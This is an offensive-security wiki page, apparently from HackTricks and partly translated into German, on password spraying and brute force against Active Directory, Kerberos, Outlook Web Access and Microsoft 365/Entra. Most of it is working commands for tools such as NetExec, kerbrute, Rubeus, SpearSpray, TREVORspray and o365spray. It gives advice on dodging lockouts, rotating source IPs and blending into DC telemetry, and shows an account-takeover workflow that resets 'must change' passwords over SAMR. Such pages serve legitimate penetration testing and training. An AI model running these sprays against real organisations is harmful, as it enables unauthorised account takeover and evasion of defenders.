# Password Spraying / Brute Force

{{#include ../../banners/hacktricks-training.md}}


## **Password Spraying**

Sobald du mehrere **gültige Benutzernamen** gefunden hast, kannst du die **häufigsten Passwörter** (beachte dabei die Passwort-Richtlinie der Umgebung) mit jedem der entdeckten Benutzer ausprobieren.\
Standardmäßig beträgt die **minimale** **Passwort**-**Länge** **7**.

Listen häufiger Benutzernamen können ebenfalls nützlich sein: [https://github.com/insidetrust/statistically-likely-usernames](https://github.com/insidetrust/statistically-likely-usernames)

Beachte, dass du **einige Konten sperren könntest, wenn du mehrere falsche Passwörter ausprobierst** (standardmäßig mehr als 10).

### Get password policy

Wenn du einige Benutzeranmeldedaten oder eine Shell als Domain-User hast, kannst du **die Passwort-Richtlinie abrufen mit**:
```bash
# From Linux
crackmapexec <IP> -u 'user' -p 'password' --pass-pol

enum4linux -u 'username' -p 'password' -P <IP>

rpcclient -U "" -N 10.10.10.10;
rpcclient $>querydominfo

ldapsearch -h 10.10.10.10 -x -b "DC=DOMAIN_NAME,DC=LOCAL" -s sub "*" | grep -m 1 -B 10 pwdHistoryLength

# From Windows
net accounts

(Get-DomainPolicy)."SystemAccess" #From powerview
```
### Ausnutzung von Linux (oder allen)

- Mit **crackmapexec:**
```bash
crackmapexec smb <IP> -u users.txt -p passwords.txt
# Local Auth Spray (once you found some local admin pass or hash)
## --local-auth flag indicate to only try 1 time per machine
crackmapexec smb --local-auth 10.10.10.10/23 -u administrator -H 10298e182387f9cab376ecd08491764a0 | grep +
```
- Verwendung von **NetExec (CME successor)** für zielgerichtetes, geräuscharmes Spraying über SMB/WinRM:
```bash
# Optional: generate a hosts entry to ensure Kerberos FQDN resolution
netexec smb <DC_IP> --generate-hosts-file hosts && cat hosts /etc/hosts | sudo sponge /etc/hosts

# Spray a single candidate password against harvested users over SMB
netexec smb <DC_FQDN> -u users.txt -p 'Password123!' \
--continue-on-success --no-bruteforce --shares

# Validate a hit over WinRM (or use SMB exec methods)
netexec winrm <DC_FQDN> -u <username> -p 'Password123!' -x "whoami"

# Tip: sync your clock before Kerberos-based auth to avoid skew issues
sudo ntpdate <DC_FQDN>
```
- Mit [**kerbrute**](https://github.com/ropnop/kerbrute) (Go)
```bash
# Password Spraying
./kerbrute_linux_amd64 passwordspray -d lab.ropnop.com [--dc 10.10.10.10] domain_users.txt Password123
# Brute-Force
./kerbrute_linux_amd64 bruteuser -d lab.ropnop.com [--dc 10.10.10.10] passwords.lst thoffman
```
- [**spray**](https://github.com/Greenwolf/Spray) _**(du kannst die Anzahl der Versuche angeben, um Sperrungen zu vermeiden):**_
```bash
spray.sh -smb <targetIP> <usernameList> <passwordList> <AttemptsPerLockoutPeriod> <LockoutPeriodInMinutes> <DOMAIN>
```
- Using [**kerbrute**](https://github.com/TarlogicSecurity/kerbrute) (python) - NICHT EMPFOHLEN, FUNKTIONIERT MANCHMAL NICHT
```bash
python kerbrute.py -domain jurassic.park -users users.txt -passwords passwords.txt -outputfile jurassic_passwords.txt
python kerbrute.py -domain jurassic.park -users users.txt -password Password123 -outputfile jurassic_passwords.txt
```
- Mit dem `scanner/smb/smb_login`-Modul von **Metasploit**:

![](<../../images/image (745).png>)

- Mit **rpcclient**:
```bash
# https://www.blackhillsinfosec.com/password-spraying-other-fun-with-rpcclient/
for u in $(cat users.txt); do
rpcclient -U "$u%Welcome1" -c "getusername;quit" 10.10.10.10 | grep Authority;
done
```
#### Von Windows

- Mit [Rubeus](https://github.com/Zer1t0/Rubeus) Version mit brute Modul:
```bash
# with a list of users
.\Rubeus.exe brute /users:<users_file> /passwords:<passwords_file> /domain:<domain_name> /outfile:<output_file>

# check passwords for all users in current domain
.\Rubeus.exe brute /passwords:<passwords_file> /outfile:<output_file>
```
- Mit [**Invoke-DomainPasswordSpray**](https://github.com/dafthack/DomainPasswordSpray/blob/master/DomainPasswordSpray.ps1) (Es kann standardmäßig Benutzer aus der Domäne generieren und die Passwort-Richtlinie aus der Domäne abrufen und die Versuche entsprechend begrenzen):
```bash
Invoke-DomainPasswordSpray -UserList .\users.txt -Password 123456 -Verbose
```
- Mit [**Invoke-SprayEmptyPassword.ps1**](https://github.com/S3cur3Th1sSh1t/Creds/blob/master/PowershellScripts/Invoke-SprayEmptyPassword.ps1)
```
Invoke-SprayEmptyPassword
```
### Identifiziere und übernimm "Password must change at next logon"-Konten (SAMR)

Eine Low-Noise-Technik ist es, ein benign/empty password zu sprayen und Accounts abzufangen, die STATUS_PASSWORD_MUST_CHANGE zurückgeben. Das zeigt an, dass das Passwort zwangsweise abgelaufen ist und ohne Kenntnis des alten Passworts geändert werden kann.

Workflow:
- Enumeriere Benutzer (RID brute via SAMR), um die Zielliste zu erstellen:

{{#ref}}
../../network-services-pentesting/pentesting-smb/rpcclient-enumeration.md
{{#endref}}
```bash
# NetExec (null/guest) + RID brute to harvest users
netexec smb <dc_fqdn> -u '' -p '' --rid-brute | awk -F'\\\\| ' '/SidTypeUser/ {print $3}' > users.txt
```
- Spraye ein leeres Passwort und fahre bei Treffern fort, um Accounts zu erfassen, die beim nächsten Anmelden das Passwort ändern müssen:
```bash
# Will show valid, lockout, and STATUS_PASSWORD_MUST_CHANGE among results
netexec smb <DC.FQDN> -u users.txt -p '' --continue-on-success
```
- Für jeden Treffer das Passwort über SAMR mit NetExecs Modul ändern (kein altes Passwort erforderlich, wenn "must change" gesetzt ist):
```bash
# Strong complexity to satisfy policy
env NEWPASS='P@ssw0rd!2025#' ; \
netexec smb <DC.FQDN> -u <User> -p '' -M change-password -o NEWPASS="$NEWPASS"

# Validate and retrieve domain password policy with the new creds
netexec smb <DC.FQDN> -u <User> -p "$NEWPASS" --pass-pol
```
Betriebsnotizen:
- Stelle sicher, dass die Uhr deines Hosts mit dem DC synchronisiert ist, bevor du Kerberos-basierte Operationen durchführst: `sudo ntpdate <dc_fqdn>`.
- Ein [+] ohne (Pwn3d!) in einigen Modulen (z. B. RDP/WinRM) bedeutet, dass die Credentials gültig sind, das Konto jedoch keine interaktiven Anmeldeberechtigungen hat.

## Brute Force
```bash
legba kerberos --target 127.0.0.1 --username admin --password wordlists/passwords.txt --kerberos-realm example.org
```
### Kerberos pre-auth spraying mit LDAP-Targeting und PSO-aware Throttling (SpearSpray)

Kerberos pre-auth–basiertes Spraying reduziert das Rauschen gegenüber SMB/NTLM/LDAP bind-Versuchen und passt besser zu AD lockout policies. SpearSpray kombiniert LDAP-gesteuertes Targeting, eine pattern engine und policy awareness (domain policy + PSOs + badPwdCount buffer), um präzise und sicher zu sprayen. Es kann außerdem kompromittierte principals in Neo4j für BloodHound pathing markieren.

Kernideen:
- LDAP user discovery mit paging und LDAPS support, optional mit custom LDAP filters.
- Domain lockout policy + PSO-aware Filtering, um einen konfigurierbaren attempt buffer (threshold) zu lassen und Nutzer nicht zu locken.
- Kerberos pre-auth validation mit schnellen gssapi bindings (erzeugt 4768/4771 auf DCs statt 4625).
- Pattern-basiertes, pro-user password generation mit Variablen wie Namen und temporalen Werten, die aus dem pwdLastSet jedes Users abgeleitet werden.
- Throughput control mit threads, jitter und max requests per second.
- Optionale Neo4j integration, um owned users für BloodHound zu markieren.

Basic usage and discovery:
```bash
# List available pattern variables
spearspray -l

# Basic run (LDAP bind over TCP/389)
spearspray -u pentester -p Password123 -d fabrikam.local -dc dc01.fabrikam.local

# LDAPS (TCP/636)
spearspray -u pentester -p Password123 -d fabrikam.local -dc dc01.fabrikam.local --ssl
```
Targeting und pattern control:
```bash
# Custom LDAP filter (e.g., target specific OU/attributes)
spearspray -u pentester -p Password123 -d fabrikam.local -dc dc01.fabrikam.local \
-q "(&(objectCategory=person)(objectClass=user)(department=IT))"

# Use separators/suffixes and an org token consumed by patterns via {separator}/{suffix}/{extra}
spearspray -u pentester -p Password123 -d fabrikam.local -dc dc01.fabrikam.local -sep @-_ -suf !? -x ACME
```
Stealth- und Sicherheitskontrollen:
```bash
# Control concurrency, add jitter, and cap request rate
spearspray -u pentester -p Password123 -d fabrikam.local -dc dc01.fabrikam.local -t 5 -j 3,5 --max-rps 10

# Leave N attempts in reserve before lockout (default threshold: 2)
spearspray -u pentester -p Password123 -d fabrikam.local -dc dc01.fabrikam.local -thr 2
```
Neo4j/BloodHound-Anreicherung:
```bash
spearspray -u pentester -p Password123 -d fabrikam.local -dc dc01.fabrikam.local -nu neo4j -np bloodhound --uri bolt://localhost:7687
```
Überblick über das Mustersystem (patterns.txt):
```text
# Example templates consuming per-user attributes and temporal context
{name}{separator}{year}{suffix}
{month_en}{separator}{short_year}{suffix}
{season_en}{separator}{year}{suffix}
{samaccountname}
{extra}{separator}{year}{suffix}
```
Available variables include:
- {name}, {samaccountname}
- Temporal from each user’s pwdLastSet (or whenCreated): {year}, {short_year}, {month_number}, {month_en}, {season_en}
- Composition helpers and org token: {separator}, {suffix}, {extra}

Operational notes:
- Favor querying the PDC-emulator with -dc to read the most authoritative badPwdCount and policy-related info.
- badPwdCount resets are triggered on the next attempt after the observation window; use threshold and timing to stay safe.
- Kerberos pre-auth attempts surface as 4768/4771 in DC telemetry; use jitter and rate-limiting to blend in.

> Tip: SpearSpray’s default LDAP page size is 200; adjust with -lps as needed.

## Outlook Web Access

There are multiples tools for p**assword spraying outlook**.

- With [MSF Owa_login](https://www.rapid7.com/db/modules/auxiliary/scanner/http/owa_login/)
- with [MSF Owa_ews_login](https://www.rapid7.com/db/modules/auxiliary/scanner/http/owa_ews_login/)
- With [Ruler](https://github.com/sensepost/ruler) (reliable!)
- With [DomainPasswordSpray](https://github.com/dafthack/DomainPasswordSpray) (Powershell)
- With [MailSniper](https://github.com/dafthack/MailSniper) (Powershell)

To use any of these tools, you need a user list and a password / a small list of passwords to spray.
```bash
./ruler-linux64 --domain reel2.htb -k brute --users users.txt --passwords passwords.txt --delay 0 --verbose
[x] Failed: larsson:Summer2020
[x] Failed: cube0x0:Summer2020
[x] Failed: a.admin:Summer2020
[x] Failed: c.cube:Summer2020
[+] Success: s.svensson:Summer2020
```
## Microsoft 365 / Entra ID

Für Cloud-Spraying solltest du zuerst identifizieren, ob der Tenant **managed**, **federated** oder **hybrid** ist, weil der Endpoint und das Lockout-Verhalten sich von on-prem AD unterscheiden können. In Microsoft Entra verändert **Smart Lockout**, wie wiederholte Versuche das Lockout-Budget verbrauchen:

- Das Wiederholen desselben **bad password** erhöht den Lockout-Zähler nicht weiter, aber das Ausprobieren **neuer Kandidaten** schon.
- **Familiar** und **unfamiliar** locations haben **separate** Zähler.
- Tenants, die **pass-through authentication (PTA)** verwenden, profitieren nicht vom bad-password-Hash-Tracking, behandle sie also eher wie klassische lockout-sensitive Targets.

In der Praxis: spraye **ein Passwort pro Runde**, halte genug Abstand zwischen den Runden und bevorzuge Tooling, das den tatsächlichen Auth-Flow des Tenants erkennen kann, bevor du Versuche sendest.

- Mit [**TREVORspray**](https://github.com/blacklanternsecurity/TREVORspray) kannst du den Tenant reconnen, den `token_endpoint` entdecken, `msol`/`adfs`/`owa`/`okta` spraye und Traffic über mehrere egress IPs rotieren:
```bash
# Enumerate tenant info, autodiscover, and the token endpoint
trevorspray --recon corp.com

# Spray against the discovered token endpoint with delay/jitter
trevorspray -u users.txt -p 'Winter2025!' \
--url https://login.windows.net/<tenant-id>/oauth2/token \
--delay 5 --jitter 3 --lockout-delay 60

# Round-robin between multiple SSH egress points
trevorspray -u users.txt -p 'Winter2025!' \
--url https://login.windows.net/<tenant-id>/oauth2/token \
--ssh root@1.2.3.4 root@4.3.2.1 --delay 5
```
- Mit [**Spray365**](https://github.com/MarkoH17/Spray365) kannst du einen fortsetzbaren **execution plan** vorab erstellen, die Auth-Reihenfolge randomisieren und eine **minimum delay per user** erzwingen, um außerhalb des Lockout-Fensters zu bleiben:
```bash
# Generate a plan with shuffled auth order and a per-user minimum delay
python3 spray365.py generate normal -ep plan.s365 -d corp.com \
-u users.txt -pf passwords.txt --delay 30 -mD 1800 \
-S -rUA

# Execute the plan and abort after observing several lockouts
python3 spray365.py spray -ep plan.s365 -l 5
```
- Mit [**o365spray**](https://github.com/0xZDH/o365spray) kannst du den Tenant validieren, Benutzer mit Modulen wie `onedrive` enumerieren und via `oauth2` oder `adfs` sprühen, während du **einen Versuch pro Benutzer** pro Lockout-Fenster einhältst. Wenn du bereits eine FireProx API hast, übergib sie mit `--proxy-url`, um die Source IPs zu verteilen:
```bash
o365spray --validate --domain corp.com
o365spray --enum -U users.txt --domain corp.com --enum-module onedrive
o365spray --spray -U valid.txt -P passwords.txt --count 1 --lockout 15 --domain corp.com
```
Recent operator tradecraft hat sich auch in Richtung **distributed cloud spraying** entwickelt. [**TeamFiltration**](https://github.com/Flangvik/TeamFiltration) unterstützt Zeitfenster, password shuffling, ADFS/M365 spraying und automatisches post-auth exfiltration. Jüngster realer Missbrauch verwendete außerdem **Microsoft Teams API**-Account-Enumeration und **AWS region rotation**, um Spray-Wellen über mehrere Source-Geografien zu verteilen.

## Google

- [https://github.com/ustayready/CredKing/blob/master/credking.py](https://github.com/ustayready/CredKing/blob/master/credking.py)

## Okta

- [https://github.com/ustayready/CredKing/blob/master/credking.py](https://github.com/ustayready/CredKing/blob/master/credking.py)
- [https://github.com/Rhynorater/Okta-Password-Sprayer](https://github.com/Rhynorater/Okta-Password-Sprayer)
- [https://github.com/knavesec/CredMaster](https://github.com/knavesec/CredMaster)

## References

- [https://github.com/sikumy/spearspray](https://github.com/sikumy/spearspray)
- [https://github.com/TarlogicSecurity/kerbrute](https://github.com/TarlogicSecurity/kerbrute)
- [https://github.com/Greenwolf/Spray](https://github.com/Greenwolf/Spray)
- [https://github.com/Hackndo/sprayhound](https://github.com/Hackndo/sprayhound)
- [https://github.com/login-securite/conpass](https://github.com/login-securite/conpass)
- [https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/active-directory-password-spraying](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/active-directory-password-spraying)
- [https://www.ired.team/offensive-security/initial-access/password-spraying-outlook-web-access-remote-shell](https://www.ired.team/offensive-security/initial-access/password-spraying-outlook-web-access-remote-shell)
- [www.blackhillsinfosec.com/?p=5296](https://www.blackhillsinfosec.com/?p=5296)
- [https://hunter2.gitbook.io/darthsidious/initial-access/password-spraying](https://hunter2.gitbook.io/darthsidious/initial-access/password-spraying)
- [Microsoft Entra smart lockout](https://learn.microsoft.com/en-us/entra/identity/authentication/howto-password-smart-lockout)
- [Proofpoint: Attackers Unleash TeamFiltration: Account Takeover Campaign](https://www.proofpoint.com/us/blog/threat-insight/attackers-unleash-teamfiltration-account-takeover-campaign)
- [HTB Sendai – 0xdf: from spray to gMSA to DA/SYSTEM](https://0xdf.gitlab.io/2025/08/28/htb-sendai.html)
- [HTB: Baby — Anonymous LDAP → Password Spray → SeBackupPrivilege → Domain Admin](https://0xdf.gitlab.io/2025/09/19/htb-baby.html)


{{#include ../../banners/hacktricks-training.md}}
